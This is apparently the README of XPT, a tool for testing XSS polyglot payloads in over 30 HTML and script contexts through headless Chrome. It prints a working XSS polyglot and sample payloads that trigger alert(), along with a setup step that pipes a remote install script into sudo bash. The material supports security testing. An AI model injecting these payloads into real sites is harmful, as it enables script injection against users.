
# XPT - XSS Polyglot Tester

XPT is a XSS polyglot testing platform allowing to test an XSS polyglot in more than 30 contexts in less than 1 minute.

This project use Google Chrome headless mode to test the execution of the XSS payload.

[![asciicast](https://asciinema.org/a/Cz5fUApO4TZCLeAKM4TddddUX.png)](https://asciinema.org/a/Cz5fUApO4TZCLeAKM4TddddUX)

## Setup on Debian

~~~sh
# Install Google Chrome
# https://askubuntu.com/questions/79280/how-to-install-chrome-browser-properly-via-command-line
sudo apt-get install libxss1 libappindicator1 libindicator7
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome*.deb  # Might show "errors", fixed by next line
sudo apt-get install -f

# Install Node Stable (v8)
curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
sudo apt-get install -y nodejs

# Run Chrome as background process
# https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md
# --disable-gpu currently required, see link above
google-chrome --headless --hide-scrollbars --remote-debugging-port=9222 --disable-gpu &

# Clone git repository
git clone https://github.com/xajkep/xpt
cd xpt/

# Create all contexts
python create_all_contexts.py

# Start local Web server 
cd server/
php -S 127.0.0.1:8080

# Run tests in all contexts for the given payload
python xpt.py --mode context --xss "<svg/onload=alert()>"
~~~

## Usage

~~~sh
    ____  ________________________
    \   \/  /\______   \__    ___/
     \     /  |     ___/ |    |   
     /     \  |    |     |    |   
    /___/\  \ |____|     |____|   
          \_/  XSS Polyglot Tester
                           @xajkep
    
usage: xpt.py [-h] [--mode MODE] [--xss XSS] [--context CONTEXT] [--list LIST]
              [--verbose VERBOSE]

optional arguments:
  -h, --help         show this help message and exit
  --mode MODE        Accepted values: 'context', 'filter' or 'test'
  --xss XSS          XSS payload
  --context CONTEXT
  --list LIST        List available contexts or filters
  --verbose VERBOSE  Yes or No

~~~

## Run tests

All contexts in `contexts.json` have a test case in order to check if the XSS is possible or not.
You can test them all by running the following commands.
~~~sh
python xpt.py --mode test
~~~

## Default XSS polyglot

~~~html
jaVaSCriPt:/*\\x3csvG/oNloAd=alert()\\x3e*/alert()//</stYle/</tiTle/</texTarEa/</scrIpt/--!><sVg//*`/*\"/*'/**/(_=alert())//\\%0a;alert()//'/oNlOad=alert() OncLick=alert()//>;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoKT4K
~~~

## Contexts

Available contexts:
 * html-element
 * html-attribute-value-double-quoted
 * html-attribute-value-single-quoted
 * html-attribute-value-not-quoted
 * html-attribute-value-not-quoted-htmlescaped
 * html-attribute-name
 * html-comment
 * textarea-element
 * title-element
 * style-element
 * style-multiline-comment
 * script-not-quoted
 * script-double-quoted
 * script-single-quoted
 * script-line-comment
 * script-line-comment-htmlescaped
 * script-multiline-comment
 * script-multiline-comment-htmlescaped
 * script-eval-backticked-htmlescaped
 * script-eval-double-quoted-htmlescaped
 * script-innerhtml-single-quote-htmlescaped
 * href-attribute-not-quoted
 * href-attribute-double-quoted
 * href-attribute-single-quoted
 * href-attribute-single-quoted-htmlescaped
 * external-script
 * external-script-htmlescaped
 * external-script-single-quoted
 * external-script-double-quoted
 * external-script-template-string-backticked
 * iframe-srcdoc-htmlescaped
 * data-uri-texthtml-htmlescaped

You can edit contexts in `contexts.json` file.

## Filters

Available filters:
 * html-comment
 * lowercase-words
 * lowercase-js-event-handlers-format
 * js-event-handlers-format
 * html-closing-tags
 * html-classic-tag-beginning

You can edit filters in `filters.json` file.

## How JS execution is detected ?

In fact, JS execution is not detected, only `alert()` execution is detected.

The nodejs script also simulate user click on the following HTML tags:
~~~html
<div>
<a>
<p>
<input>
<img>
<video>
<button>
<x>
~~~

Click will be done only on the first tag found (for each tags).

## Sources / Resources

 * [Unleashing an Ultimate XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 * [HTML5 Security Cheatsheet](https://html5sec.org)
 * [Getting Started with Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome)
